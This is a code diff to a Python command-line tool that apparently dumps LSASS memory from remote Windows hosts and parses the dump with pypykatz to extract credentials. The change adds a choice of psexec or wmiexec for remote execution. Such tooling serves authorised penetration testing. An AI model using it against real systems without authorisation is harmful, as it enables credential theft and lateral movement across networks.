@@ -19,6 +19,7 @@ def main():
         type=int,
         help="equals 1 or 0| Creds obtaining location will be written in report file",
     )
+    parser.add_argument("--auth", help="Auth with psexec or wmiexec")
     args = parser.parse_args()
     if len(sys.argv) > 1:
         pass
@@ -28,6 +29,10 @@ def main():
     password = args.password
     domain = args.domain
     verbose_report = args.verbose_report
+    auth = args.auth
+    if args.auth not in ["wmiexec", "psexec"]:
+        print("Check auth type")
+        sys.exit(1)
 
     if args.target_file:
         targets_list = []
@@ -40,6 +45,7 @@ def main():
                     password=password,
                     domain=domain,
                     target=target.strip(),
+                    auth=auth,
                 )
                 task.run()
                 Dumper.dump_to_pypykatz(dump_file="./lsass_dump.dmp")
@@ -51,7 +57,11 @@ def main():
     else:
         target = args.target
         task = Dumper(
-            username=username, password=password, domain=domain, target=target
+            username=username,
+            password=password,
+            domain=domain,
+            target=target,
+            auth=auth,
         )
         task.run()
         Dumper.dump_to_pypykatz(dump_file="./lsass_dump.dmp")
